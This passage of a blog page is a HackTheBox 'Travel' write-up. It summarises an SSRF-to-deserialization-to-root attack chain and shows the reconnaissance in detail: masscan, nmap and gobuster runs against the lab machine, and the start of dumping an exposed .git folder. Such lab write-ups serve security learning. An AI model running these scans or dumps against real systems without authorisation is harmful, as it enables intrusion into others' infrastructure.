@@ -1,0 +1,1863 @@
+<!DOCTYPE html><html lang="en" mode="dark" > <!-- The Head v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><title>HackTheBox — Travel Writeup | ColdFusionX</title><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="HackTheBox — Travel Writeup" /><meta name="author" content="Mayank Deshmukh" /><meta property="og:locale" content="en_US" /><meta name="description" content="Travel from HackTheBox is an amazing machine as it involves Source Code review and SSRF which I personally enjoy a lot. We’ll start with basic enumeration where we land up with multiple VHosts, while fuzzing them we discover an exposed .git folder. This git folder provides us PHP source code of an custom RSS feed functionality being used on the blog, which accepts user supplied inputs and cache it using memcache. On further analysing we find an PHP deserialization vulnerability inside memcache, as memcache deserializes data upon retrieving it from cache. We’ll perform an SSRF using gopher protocol and exploit it by poisoning the memcache with a serialized PHP payload containing an command shell which will give us RCE and eventually a reverse shell inside a docker container. Subsequently we’ll find password hash of a user who is an LDAP administrator, crack it using john, SSH to server and grab the user flag. For elevating privileges to root, we will manipulate attributes of a user in an LDAP database by adding it to sudo group, adding SSH public key &amp; password attributes to their LDAP using a GUI tool. Additionally, we will also gain root by adding the user to docker group using it as the second privilege escalation vector." /><meta property="og:description" content="Travel from HackTheBox is an amazing machine as it involves Source Code review and SSRF which I personally enjoy a lot. We’ll start with basic enumeration where we land up with multiple VHosts, while fuzzing them we discover an exposed .git folder. This git folder provides us PHP source code of an custom RSS feed functionality being used on the blog, which accepts user supplied inputs and cache it using memcache. On further analysing we find an PHP deserialization vulnerability inside memcache, as memcache deserializes data upon retrieving it from cache. We’ll perform an SSRF using gopher protocol and exploit it by poisoning the memcache with a serialized PHP payload containing an command shell which will give us RCE and eventually a reverse shell inside a docker container. Subsequently we’ll find password hash of a user who is an LDAP administrator, crack it using john, SSH to server and grab the user flag. For elevating privileges to root, we will manipulate attributes of a user in an LDAP database by adding it to sudo group, adding SSH public key &amp; password attributes to their LDAP using a GUI tool. Additionally, we will also gain root by adding the user to docker group using it as the second privilege escalation vector." /><link rel="canonical" href="http://localhost:4000/posts/TravelHTB/" /><meta property="og:url" content="http://localhost:4000/posts/TravelHTB/" /><meta property="og:site_name" content="ColdFusionX" /><meta property="og:image" content="http://localhost:4000/assets/img/Posts/Travel.png" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2020-09-25T10:50:00+05:30" /><meta name="twitter:card" content="summary_large_image" /><meta property="twitter:image" content="http://localhost:4000/assets/img/Posts/Travel.png" /><meta property="twitter:title" content="HackTheBox — Travel Writeup" /><meta name="twitter:site" content="@ColdFusionX_" /><meta name="twitter:creator" content="@Mayank Deshmukh" /><meta name="google-site-verification" content="CtBtIysuQ8b6k36FI7jqU-o34DRoA_sye50a-RNtPPY" /> <script type="application/ld+json"> {"headline":"HackTheBox — Travel Writeup","dateModified":"2020-09-25T10:50:00+05:30","datePublished":"2020-09-25T10:50:00+05:30","image":"http://localhost:4000/assets/img/Posts/Travel.png","url":"http://localhost:4000/posts/TravelHTB/","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/TravelHTB/"},"author":{"@type":"Person","name":"Mayank Deshmukh"},"description":"Travel from HackTheBox is an amazing machine as it involves Source Code review and SSRF which I personally enjoy a lot. We’ll start with basic enumeration where we land up with multiple VHosts, while fuzzing them we discover an exposed .git folder. This git folder provides us PHP source code of an custom RSS feed functionality being used on the blog, which accepts user supplied inputs and cache it using memcache. On further analysing we find an PHP deserialization vulnerability inside memcache, as memcache deserializes data upon retrieving it from cache. We’ll perform an SSRF using gopher protocol and exploit it by poisoning the memcache with a serialized PHP payload containing an command shell which will give us RCE and eventually a reverse shell inside a docker container. Subsequently we’ll find password hash of a user who is an LDAP administrator, crack it using john, SSH to server and grab the user flag. For elevating privileges to root, we will manipulate attributes of a user in an LDAP database by adding it to sudo group, adding SSH public key &amp; password attributes to their LDAP using a GUI tool. Additionally, we will also gain root by adding the user to docker group using it as the second privilege escalation vector.","@type":"BlogPosting","@context":"https://schema.org"}</script><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><title>HackTheBox — Travel Writeup | ColdFusionX</title><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="HackTheBox — Travel Writeup" /><meta name="author" content="Mayank Deshmukh" /><meta property="og:locale" content="en_US" /><meta name="description" content="Travel from HackTheBox is an amazing machine as it involves Source Code review and SSRF which I personally enjoy a lot. We’ll start with basic enumeration where we land up with multiple VHosts, while fuzzing them we discover an exposed .git folder. This git folder provides us PHP source code of an custom RSS feed functionality being used on the blog, which accepts user supplied inputs and cache it using memcache. On further analysing we find an PHP deserialization vulnerability inside memcache, as memcache deserializes data upon retrieving it from cache. We’ll perform an SSRF using gopher protocol and exploit it by poisoning the memcache with a serialized PHP payload containing an command shell which will give us RCE and eventually a reverse shell inside a docker container. Subsequently we’ll find password hash of a user who is an LDAP administrator, crack it using john, SSH to server and grab the user flag. For elevating privileges to root, we will manipulate attributes of a user in an LDAP database by adding it to sudo group, adding SSH public key &amp; password attributes to their LDAP using a GUI tool. Additionally, we will also gain root by adding the user to docker group using it as the second privilege escalation vector." /><meta property="og:description" content="Travel from HackTheBox is an amazing machine as it involves Source Code review and SSRF which I personally enjoy a lot. We’ll start with basic enumeration where we land up with multiple VHosts, while fuzzing them we discover an exposed .git folder. This git folder provides us PHP source code of an custom RSS feed functionality being used on the blog, which accepts user supplied inputs and cache it using memcache. On further analysing we find an PHP deserialization vulnerability inside memcache, as memcache deserializes data upon retrieving it from cache. We’ll perform an SSRF using gopher protocol and exploit it by poisoning the memcache with a serialized PHP payload containing an command shell which will give us RCE and eventually a reverse shell inside a docker container. Subsequently we’ll find password hash of a user who is an LDAP administrator, crack it using john, SSH to server and grab the user flag. For elevating privileges to root, we will manipulate attributes of a user in an LDAP database by adding it to sudo group, adding SSH public key &amp; password attributes to their LDAP using a GUI tool. Additionally, we will also gain root by adding the user to docker group using it as the second privilege escalation vector." /><link rel="canonical" href="http://localhost:4000/posts/TravelHTB/" /><meta property="og:url" content="http://localhost:4000/posts/TravelHTB/" /><meta property="og:site_name" content="ColdFusionX" /><meta property="og:image" content="http://localhost:4000/assets/img/Posts/Travel.png" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2020-09-25T10:50:00+05:30" /><meta name="twitter:card" content="summary_large_image" /><meta property="twitter:image" content="http://localhost:4000/assets/img/Posts/Travel.png" /><meta property="twitter:title" content="HackTheBox — Travel Writeup" /><meta name="twitter:site" content="@ColdFusionX_" /><meta name="twitter:creator" content="@Mayank Deshmukh" /><meta name="google-site-verification" content="CtBtIysuQ8b6k36FI7jqU-o34DRoA_sye50a-RNtPPY" /> <script type="application/ld+json"> {"headline":"HackTheBox — Travel Writeup","dateModified":"2020-09-25T10:50:00+05:30","datePublished":"2020-09-25T10:50:00+05:30","image":"http://localhost:4000/assets/img/Posts/Travel.png","url":"http://localhost:4000/posts/TravelHTB/","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/TravelHTB/"},"author":{"@type":"Person","name":"Mayank Deshmukh"},"description":"Travel from HackTheBox is an amazing machine as it involves Source Code review and SSRF which I personally enjoy a lot. We’ll start with basic enumeration where we land up with multiple VHosts, while fuzzing them we discover an exposed .git folder. This git folder provides us PHP source code of an custom RSS feed functionality being used on the blog, which accepts user supplied inputs and cache it using memcache. On further analysing we find an PHP deserialization vulnerability inside memcache, as memcache deserializes data upon retrieving it from cache. We’ll perform an SSRF using gopher protocol and exploit it by poisoning the memcache with a serialized PHP payload containing an command shell which will give us RCE and eventually a reverse shell inside a docker container. Subsequently we’ll find password hash of a user who is an LDAP administrator, crack it using john, SSH to server and grab the user flag. For elevating privileges to root, we will manipulate attributes of a user in an LDAP database by adding it to sudo group, adding SSH public key &amp; password attributes to their LDAP using a GUI tool. Additionally, we will also gain root by adding the user to docker group using it as the second privilege escalation vector.","@type":"BlogPosting","@context":"https://schema.org"}</script> <!-- The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps Generated by: https://www.favicon-generator.org/ v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung Published under the MIT license --><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="preload" as="style" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"> <!-- CSS selector for site. Chirpy v2.3 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT Licensed --><link rel="preload" as="style" href="/assets/css/post.css"><link rel="stylesheet" href="/assets/css/post.css"><link rel="preload" as="style" href="/assets/css/lib/bootstrap-toc.min.css"><link rel="stylesheet" href="/assets/css/lib/bootstrap-toc.min.css" /><link rel="preload" as="script" href="https://cdn.jsdelivr.net/npm/jquery@3.4.1" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"> <script src="https://cdn.jsdelivr.net/npm/jquery@3.4.1" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4.0.0/dist/js/bootstrap.min.js" async></script> <!-- JS selector for site. Chirpy v2.3 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT Licensed --> <script src="/assets/js/post.min.js" async></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column"> <!-- The Side Bar v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="nav-wrapper"><div id="profile-wrapper" class="d-flex flex-column"><div id="avatar" class="d-flex justify-content-center"> <a href="/" alt="avatar"> <img src="/assets/img/sample/profile.jpg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="profile-text mt-3"><div class="site-title"> <a href="/">ColdFusionX</a></div><div class="site-subtitle font-italic">CTF Player | Pentester | InfoSec Enthusiast</div></div></div><ul class="nav flex-column"><li class="nav-item d-flex justify-content-center "> <a href="/" class="nav-link d-flex justify-content-center align-items-center w-100"> <span><i class="fas fa-home"></i> HOME</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/categories/" class="nav-link d-flex justify-content-center align-items-center w-100"> <span><i class="fas fa-stream"></i> CATEGORIES</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/tags/" class="nav-link d-flex justify-content-center align-items-center w-100"> <span><i class="fas fa-tags"></i> TAGS</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/archives/" class="nav-link d-flex justify-content-center align-items-center w-100"> <span><i class="fas fa-archive"></i> ARCHIVES</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/about/" class="nav-link d-flex justify-content-center align-items-center w-100"> <span><i class="fas fa-id-card"></i> ABOUT</span> </a></li></ul></div><div class="sidebar-bottom d-flex flex-wrap justify-content-around mt-4"> <a href="https://github.com/ColdFusionX" target="_blank"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/ColdFusionX_" target="_blank"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:window.open('mailto:' + ['coldfusionx','outlook.com'].join('@'))" > <i class="fas fa-envelope"></i> </a> <a href="https://app.hackthebox.com/profile/163155" target="_blank"> <i class="fas fa-cube"></i> </a> <a href="https://www.linkedin.com/in/b3t4m3/" target="_blank"> <i class="fab fa-linkedin"></i> </a></div></div><!-- The Top Bar v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>HackTheBox — Travel Writeup</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"> <!-- Refactor the HTML structure. --> <!-- Suroundding the markdown table with '<div class="table-wrapper">. and '</div>' --> <!-- Fixed kramdown code highlight rendering: https://github.com/penibelst/jekyll-compress-html/issues/101 https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901 --><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>HackTheBox — Travel Writeup</h1><div class="post-meta text-muted d-flex flex-column"><div> Posted <!-- Date format snippet v2.4.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --> <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Fri, Sep 25, 2020, 10:50 AM +0530" > Sep 25, 2020 <i class="unloaded">2020-09-25T10:50:00+05:30</i> </span> by <span class="author"> Mayank Deshmukh </span></div><div> Updated <!-- Date format snippet v2.4.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --> <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Fri, Sep 25, 2020, 12:12 PM +0530" > Sep 25, 2020 <i class="unloaded">2020-09-25T12:12:57+05:30</i> </span></div></div><div class="post-content"> <img src="/assets/img/Posts/Travel.png" class="post-preview-img"><blockquote><p>Travel from HackTheBox is an amazing machine as it involves Source Code review and SSRF which I personally enjoy a lot. We’ll start with basic enumeration where we land up with multiple VHosts, while fuzzing them we discover an exposed .git folder. This git folder provides us PHP source code of an custom RSS feed functionality being used on the blog, which accepts user supplied inputs and cache it using memcache. On further analysing we find an PHP deserialization vulnerability inside memcache, as memcache deserializes data upon retrieving it from cache. We’ll perform an SSRF using gopher protocol and exploit it by poisoning the memcache with a serialized PHP payload containing an command shell which will give us RCE and eventually a reverse shell inside a docker container. Subsequently we’ll find password hash of a user who is an LDAP administrator, crack it using john, SSH to server and grab the user flag. For elevating privileges to root, we will manipulate attributes of a user in an LDAP database by adding it to sudo group, adding SSH public key &amp; password attributes to their LDAP using a GUI tool. Additionally, we will also gain root by adding the user to docker group using it as the second privilege escalation vector.</p></blockquote><h2 id="reconnaissance">Reconnaissance</h2><p>Let’s begin with <code class="language-plaintext highlighter-rouge">masscan</code> &amp; <code class="language-plaintext highlighter-rouge">nmap</code> to discover open ports and services:</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+</pre><td class="rouge-code"><pre>cfx:  ~/Documents/htb/travel
+→ masscan <span class="nt">-e</span> tun0 <span class="nt">-p0-65535</span> <span class="nt">--max-rate</span> 500 10.10.10.189
+
+Starting masscan 1.0.5 <span class="o">(</span>http://bit.ly/14GZzcT<span class="o">)</span> at 2020-09-20 14:29:04 GMT
+ <span class="nt">--</span> forced options: <span class="nt">-sS</span> <span class="nt">-Pn</span> <span class="nt">-n</span> <span class="nt">--randomize-hosts</span> <span class="nt">-v</span> <span class="nt">--send-eth</span>
+Initiating SYN Stealth Scan
+Scanning 1 hosts <span class="o">[</span>65536 ports/host]
+Discovered open port 80/tcp on 10.10.10.189
+Discovered open port 443/tcp on 10.10.10.189
+Discovered open port 22/tcp on 10.10.10.189
+
+cfx:  ~/Documents/htb/travel
+→ nmap <span class="nt">-A</span> <span class="nt">-T4</span> <span class="nt">-p22</span>,80,443 10.10.10.189
+Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2020-09-20 20:09 IST
+Nmap scan report <span class="k">for </span>blog.travel.htb <span class="o">(</span>10.10.10.189<span class="o">)</span>
+Host is up <span class="o">(</span>0.22s latency<span class="o">)</span><span class="nb">.</span>
+
+PORT    STATE SERVICE  VERSION
+22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+80/tcp  open  http     nginx 1.17.6
+|_http-generator: WordPress 5.4
+| http-robots.txt: 1 disallowed entry
+|_/wp-admin/
+|_http-server-header: nginx/1.17.6
+|_http-title: Travel Blog &amp;#8211<span class="p">;</span> Who doesn&amp;#039<span class="p">;</span>t love to travel ?
+443/tcp open  ssl/http nginx 1.17.6
+|_http-server-header: nginx/1.17.6
+|_http-title: Travel.HTB - SSL coming soon.
+| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>www.travel.htb/organizationName<span class="o">=</span>Travel.HTB/countryName<span class="o">=</span>UK
+| Subject Alternative Name: DNS:www.travel.htb, DNS:blog.travel.htb, DNS:blog-dev.travel.htb
+| Not valid before: 2020-04-23T19:24:29
+|_Not valid after:  2030-04-21T19:24:29
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Aggressive OS guesses: Linux 2.6.18 - 2.6.22 <span class="o">(</span>96%<span class="o">)</span>, Linux 3.2.0 <span class="o">(</span>96%<span class="o">)</span>, Tomato 1.27 - 1.28 <span class="o">(</span>Linux 2.4.20<span class="o">)</span> <span class="o">(</span>96%<span class="o">)</span>, Tomato 1.28 <span class="o">(</span>Linux 2.4.20<span class="o">)</span> <span class="o">(</span>95%<span class="o">)</span>, Linux 3.7 <span class="o">(</span>95%<span class="o">)</span>, Linux 2.6.18 <span class="o">(</span>95%<span class="o">)</span>, MikroTik RouterOS 6.15 <span class="o">(</span>Linux 3.3.5<span class="o">)</span> <span class="o">(</span>94%<span class="o">)</span>, ZoneAlarm Z100G WAP <span class="o">(</span>94%<span class="o">)</span>, Linux 4.8 <span class="o">(</span>93%<span class="o">)</span>, HP Onboard Administrator 4.12 - 4.40 <span class="o">(</span>92%<span class="o">)</span>
+No exact OS matches <span class="k">for </span>host <span class="o">(</span><span class="nb">test </span>conditions non-ideal<span class="o">)</span><span class="nb">.</span>
+Network Distance: 2 hops
+Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE <span class="o">(</span>using port 443/tcp<span class="o">)</span>
+HOP RTT       ADDRESS
+1   373.94 ms 10.10.14.1
+2   374.78 ms blog.travel.htb <span class="o">(</span>10.10.10.189<span class="o">)</span>
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>34.18 seconds
+</pre></table></code></div></div><p>Based on the scan results we can port see <code class="language-plaintext highlighter-rouge">22,80,443</code> are open, nmap also gives us SAN results indicating additional hostnames used by SSL-Certificate, so lets just add them to our host file and start with Port <code class="language-plaintext highlighter-rouge">80 &amp; 443</code> enumeration.</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre><td class="rouge-code"><pre>cfx:  ~/Documents/htb/travel
+→ <span class="nb">cat</span> /etc/hosts | <span class="nb">grep </span>travel
+10.10.10.189    blog.travel.htb blog-dev.travel.htb www.travel.htb
+</pre></table></code></div></div><h3 id="https---port-443">HTTPS - Port 443</h3><p>Looking at https://10.10.10.189 doesn’t reveals anything interesting except for the domain names from the SSL-Certificate</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/Posts/Travel/website.png" alt="website" /></p><h3 id="http---port-80">HTTP - Port 80</h3><h4 id="httpwwwtravelhtb">http://www.travel.htb</h4><p>The webpage displayed seems to be a static webpage with non-functional links, nothing useful for us.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/Posts/Travel/website1.png" alt="website1" /></p><h4 id="httpblogtravelhtb">http://blog.travel.htb</h4><p>The blog site contains several functional links and reveals its running WordPress instance at footer of the site. A welcome message hints us to check out <code class="language-plaintext highlighter-rouge">new RSS feature coming from blog-dev team</code> which is our next enumeration target.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/Posts/Travel/website2.png" alt="website2" /></p><p>Before moving ahead to our next vhost, I decided to run <code class="language-plaintext highlighter-rouge">gobuster</code> to discover hidden files and directories associated with this site, unfortunately it didn’t return anything useful.</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+</pre><td class="rouge-code"><pre>cfx:  ~/Documents/htb/travel
+→ gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://blog.travel.htb <span class="nt">-w</span> /usr/share/wordlists/seclists/Discovery/Web-Conten
+t/common.txt
+<span class="o">===============================================================</span>
+Gobuster v3.0.1
+by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> &amp; Christian Mehlmauer <span class="o">(</span>@_FireFart_<span class="o">)</span>
+<span class="o">===============================================================</span>
+<span class="o">[</span>+] Url:            http://blog.travel.htb
+<span class="o">[</span>+] Threads:        10
+<span class="o">[</span>+] Wordlist:       /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
+<span class="o">[</span>+] Status codes:   200,204,301,302,307,401,403
+<span class="o">[</span>+] User Agent:     gobuster/3.0.1
+<span class="o">[</span>+] Timeout:        10s
+<span class="o">===============================================================</span>
+2020/09/20 20:21:34 Starting gobuster
+<span class="o">===============================================================</span>
+/.hta <span class="o">(</span>Status: 403<span class="o">)</span>
+/.htaccess <span class="o">(</span>Status: 403<span class="o">)</span>
+/.htpasswd <span class="o">(</span>Status: 403<span class="o">)</span>
+/0 <span class="o">(</span>Status: 301<span class="o">)</span>
+/A <span class="o">(</span>Status: 301<span class="o">)</span>
+/H <span class="o">(</span>Status: 301<span class="o">)</span>
+/a <span class="o">(</span>Status: 301<span class="o">)</span>
+/admin <span class="o">(</span>Status: 302<span class="o">)</span>
+/atom <span class="o">(</span>Status: 301<span class="o">)</span>
+/aw <span class="o">(</span>Status: 301<span class="o">)</span>
+/dashboard <span class="o">(</span>Status: 302<span class="o">)</span>
+/embed <span class="o">(</span>Status: 301<span class="o">)</span>
+/favicon.ico <span class="o">(</span>Status: 302<span class="o">)</span>
+/feed <span class="o">(</span>Status: 301<span class="o">)</span>
+/h <span class="o">(</span>Status: 301<span class="o">)</span>
+/hello <span class="o">(</span>Status: 301<span class="o">)</span>
+/index.php <span class="o">(</span>Status: 301<span class="o">)</span>
+/login <span class="o">(</span>Status: 302<span class="o">)</span>
+/page1 <span class="o">(</span>Status: 301<span class="o">)</span>
+/rdf <span class="o">(</span>Status: 301<span class="o">)</span>
+/robots.txt <span class="o">(</span>Status: 200<span class="o">)</span>
+/rss <span class="o">(</span>Status: 301<span class="o">)</span>
+/rss2 <span class="o">(</span>Status: 301<span class="o">)</span>
+/server-status <span class="o">(</span>Status: 403<span class="o">)</span>
+/wp-admin <span class="o">(</span>Status: 301<span class="o">)</span>
+/wp-content <span class="o">(</span>Status: 301<span class="o">)</span>
+/wp-includes <span class="o">(</span>Status: 301<span class="o">)</span>
+<span class="o">===============================================================</span>
+2020/09/20 20:24:29 Finished
+<span class="o">===============================================================</span>
+</pre></table></code></div></div><h4 id="httpblog-devtravelhtb">http://blog-dev.travel.htb</h4><p>On visiting the site we get a <code class="language-plaintext highlighter-rouge">403 forbidden</code> error indicating a possibility of an <code class="language-plaintext highlighter-rouge">.htaccess</code> config file which is preventing us from directory indexing.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/Posts/Travel/website3.png" alt="website3" /></p><p>To further enumerate we can run <code class="language-plaintext highlighter-rouge">gobuster</code> to discover hidden files and directories:</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+</pre><td class="rouge-code"><pre>cfx:  ~/Documents/htb/travel
+→ gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://blog-dev.travel.htb <span class="nt">-w</span> /usr/share/wordlists/seclists/Discovery/Web-Co
+ntent/common.txt
+<span class="o">===============================================================</span>
+Gobuster v3.0.1
+by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> &amp; Christian Mehlmauer <span class="o">(</span>@_FireFart_<span class="o">)</span>
+<span class="o">===============================================================</span>
+<span class="o">[</span>+] Url:            http://blog-dev.travel.htb
+<span class="o">[</span>+] Threads:        10
+<span class="o">[</span>+] Wordlist:       /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
+<span class="o">[</span>+] Status codes:   200,204,301,302,307,401,403
+<span class="o">[</span>+] User Agent:     gobuster/3.0.1
+<span class="o">[</span>+] Timeout:        10s
+<span class="o">===============================================================</span>
+2020/09/20 20:24:59 Starting gobuster
+<span class="o">===============================================================</span>
+/.git/HEAD <span class="o">(</span>Status: 200<span class="o">)</span>
+<span class="o">===============================================================</span>
+2020/09/20 20:27:14 Finished
+<span class="o">===============================================================</span>
+</pre></table></code></div></div><p>Looking at the output from gobuster we found an hidden <code class="language-plaintext highlighter-rouge">.git</code> repository.</p><h3 id="dumping-git-repo">Dumping git repo</h3><p>Since we discovered a <code class="language-plaintext highlighter-rouge">.git</code> directory on blog-dev site, let use GitTools available <a href="https://github.com/internetwache/GitTools"><strong>here</strong></a> to dump the git repository contents</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+</pre><td class="rouge-code"><pre>cfx:  ~/Documents/htb/travel/gitrepo
+→ /opt/GitTools/Dumper/gitdumper.sh http://blog-dev.travel.htb/.git/ <span class="nb">.</span>
+<span class="c">###########</span>
+<span class="c"># GitDumper is part of https://github.com/internetwache/GitTools</span>
+<span class="c">#</span>
+<span class="c"># Developed and maintained by @gehaxelt from @internetwache</span>
+<span class="c">#</span>
+<span class="c"># Use at your own risk. Usage might be illegal in certain circumstances.</span>
+<span class="c"># Only for educational purposes!</span>
